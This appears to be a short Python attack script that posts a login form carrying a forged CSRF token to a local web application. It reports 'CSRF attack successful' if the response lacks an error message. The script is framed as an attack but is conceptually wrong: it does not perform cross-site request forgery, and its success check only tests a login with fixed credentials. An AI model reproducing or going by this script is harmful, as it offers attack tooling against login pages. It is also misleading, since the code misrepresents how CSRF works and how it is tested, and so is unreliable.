import requests

# Set the target URL
url = "http://127.0.0.1:8000/login/"

# Set the malicious payload
payload = {
    "username": "hacker",
    "password": "123456",
    "csrfmiddlewaretoken": "malicious_token"
}

# Send the malicious request
response = requests.post(url, data=payload)

# Check if the attack was successful

if response.status_code == 200 and "Invalid username or password" not in response.text:
    print("CSRF attack successful!")
else:
    print("CSRF attack failed.")
